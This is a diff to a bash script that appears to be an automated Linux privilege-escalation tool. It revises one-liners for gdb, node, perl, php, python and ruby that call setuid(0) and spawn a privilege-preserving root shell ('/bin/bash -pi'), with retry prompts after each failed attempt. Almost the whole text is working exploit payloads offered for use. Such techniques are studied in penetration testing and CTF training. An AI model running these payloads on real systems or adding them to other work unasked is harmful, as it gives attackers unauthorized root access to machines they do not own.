@@ -175,7 +175,7 @@ while true; do
                                         
                             echo "Trying with $choice"
                             
-                            "$choice" -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
+                            "$choice" -nx -ex 'python3 import os; os.setuid(0)' -ex '!/bin/bash -pi' -ex quit
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
 
@@ -190,7 +190,7 @@ while true; do
                                         
                             echo "Trying with $choice"
                             
-                            "$choice" -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
+                            "$choice" -e 'process.setuid(0); require("child_process").spawn("/bin/bash -pi", {stdio: [0, 1, 2]})'
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
 
@@ -205,7 +205,7 @@ while true; do
                                         
                             echo "Trying with $choice"
                             
-                            "$choice" -e 'exec "/bin/bash"'
+                            "$choice" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -pi"'
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
 
@@ -220,7 +220,7 @@ while true; do
                                         
                             echo "Trying with $choice"
                             
-                            "$choice" -r 'posix_setuid(0); system("/bin/bash -i");'
+                            "$choice" -r 'posix_setuid(0); system("/bin/bash -pi");'
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
 
@@ -235,7 +235,7 @@ while true; do
                                         
                             echo "Trying with $choice"
                             
-                            "$choice" -c 'import os; os.setuid(0); os.system("bash")'
+                            "$choice" -c 'import os; os.setuid(0); os.system("/bin/bash -pi")'
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
 
@@ -250,7 +250,7 @@ while true; do
                                         
                             echo "Trying with $choice"
                             
-                            "$choice" -e 'Process::Sys.setuid(0); exec "/bin/bash"'
+                            "$choice" -e 'Process::Sys.setuid(0); exec "/bin/bash -pi"'
 
                             read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
 
